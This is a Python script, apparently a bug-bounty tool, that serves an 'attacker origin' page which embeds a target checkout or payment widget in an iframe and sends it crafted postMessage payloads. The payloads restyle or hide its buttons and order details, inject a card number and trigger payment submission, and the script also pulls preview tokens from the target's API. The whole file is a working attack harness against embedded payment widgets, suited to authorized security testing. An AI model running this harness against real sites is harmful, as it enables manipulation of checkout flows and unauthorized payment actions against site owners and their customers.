#!/usr/bin/env python3
"""Generic attacker-origin postMessage harness for embedded widgets (checkout/iframe SDKs).

Serves ONE page from your own origin (default http://127.0.0.1:8899/harness.html) that:
  * iframes a target widget URL,
  * logs every message the widget posts back (proves the channel is cross-origin-live),
  * lets you fire each message type at the widget with one click.

Usage:
  TARGET_URL='https://target/hosted/preview?token=REPLACE_ME' python postmessage_harness.py [port]
  # optional: TOKEN_URL='https://api.target/v1/hosted/config/preview_tokens?type=checkout'
  #           -> the page fetches it and uses data[0].token (incl. demo tokens) automatically
  # MSGS='[{"type":"PARAMS","data":{"hideOrderDetails":true}},{"type":"X_SUBMIT","data":{}}]'
  #           -> replaces the default payload button set

Then drive it with the CDP browser of your choice and read the widget's own DOM by attaching to the
out-of-process iframe target (see references/postmessage-iframe-channel-testing.md, section 4).
"""
import json
import os
import sys
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else int(os.environ.get("PORT", "8899"))
TARGET_URL = os.environ.get("TARGET_URL", "")
TOKEN_URL = os.environ.get("TOKEN_URL", "")
DEFAULT_MSGS = [
    {"type": "PARAMS", "data": {"btnText": "Confirm", "btnColor": "#ff0000", "hideOrderDetails": True}},
    {"type": "PARAMS", "data": {"hideSubmitButton": True}},
    {"type": "PARAMS", "data": {"customStyles": {"body": "background:#000 !important"}}},
    {"type": "PREVIEW_PARAMS", "data": {"ctaText": "Confirm", "buttonColor": "#ff0000"}},
    {"type": "PREVIEW_SET_CARD_DETAILS", "data": {"card_number": "4111111111111111"}},
    {"type": "CHECKOUT_SUBMIT_PAYMENT", "data": {}},
    {"type": "CLOSE_IFRAME", "data": {}},
]
try:
    MSGS = json.loads(os.environ.get("MSGS", "")) or DEFAULT_MSGS
except Exception:
    MSGS = DEFAULT_MSGS

PAGE = """<!doctype html><html><head><meta charset="utf-8">
<title>postMessage harness (attacker origin)</title>
<style>body{font:13px/1.4 monospace;background:#111;color:#eee;margin:0;padding:8px}
#wrap{display:flex;gap:8px}#left{flex:0 0 420px}#right{flex:1}
iframe{width:100%;height:640px;border:1px solid #444;background:#fff}
button{margin:1px;padding:3px 6px;font:11px monospace;cursor:pointer}
pre{background:#000;color:#0f0;padding:6px;height:260px;overflow:auto;white-space:pre-wrap}</style>
</head><body><div id="wrap"><div id="left">
<div><b>attacker origin:</b> <span id="org"></span></div>
<div><b>target:</b> <span id="tgt"></span></div>
<div id="btns"></div><pre id="log"></pre></div>
<div id="right"><iframe id="f"></iframe></div></div>
<script>
const log=[], f=document.getElementById('f');
function L(x){ log.push(x); document.getElementById('log').textContent=log.join('\\n'); }
document.getElementById('org').textContent=location.origin;
window.addEventListener('message', e=>{
  L('<< FROM '+e.origin+' :: '+JSON.stringify(e.data).slice(0,800));
});
const TARGET='__TARGET__', TOKEN_URL='__TOKEN_URL__', MSGS=__MSGS__;
function load(t){ document.getElementById('tgt').textContent=t.slice(0,110); L('>> loading '+t.slice(0,100)); f.src=t; }
if(TOKEN_URL){
  fetch('/api/token').then(r=>r.json()).then(j=>{
    const d=(j&&j.data)||j||[];
    const t=(d.find&&d.find(x=>x.is_demo))||d[0]||{};
    if(!t.token){ L('!! no token in response: '+JSON.stringify(j).slice(0,200)); return; }
    load(TARGET.replace('REPLACE_ME', t.token));
  }).catch(e=>L('token fetch err '+e));
} else if(TARGET){ load(TARGET); } else { L('!! set TARGET_URL (or TOKEN_URL)'); }
const wrap=document.getElementById('btns');
MSGS.forEach((p,i)=>{
  const b=document.createElement('button');
  b.textContent=(i+1)+': '+p.type;
  b.onclick=()=>{ try{ f.contentWindow.postMessage(p,'*'); L('>> '+JSON.stringify(p).slice(0,300)); }
                  catch(e){ L('send err '+e); } };
  wrap.appendChild(b);
});
const all=document.createElement('button');
all.textContent='FIRE ALL'; all.onclick=()=>MSGS.forEach(p=>f.contentWindow.postMessage(p,'*'));
wrap.appendChild(all);
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path.startswith("/api/token"):
            body = b'{"data":[]}'
            try:
                req = urllib.request.Request(TOKEN_URL, headers={
                    "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                    "X-Bugcrowd": os.environ.get("X_BUGCROWD", "Bugcrowd-researcher")})
                with urllib.request.urlopen(req, timeout=20) as r:
                    body = r.read()
            except Exception as e:
                body = json.dumps({"error": str(e)}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
            return
        html = (PAGE.replace("__TARGET__", TARGET_URL)
                    .replace("__TOKEN_URL__", TOKEN_URL)
                    .replace("__MSGS__", json.dumps(MSGS)))
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())


if __name__ == "__main__":
    print(f"harness: http://127.0.0.1:{PORT}/harness.html", flush=True)
    print(f"target : {TARGET_URL or '(none - will try TOKEN_URL)'}", flush=True)
    print(f"token  : {TOKEN_URL or '(none)'}", flush=True)
    ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
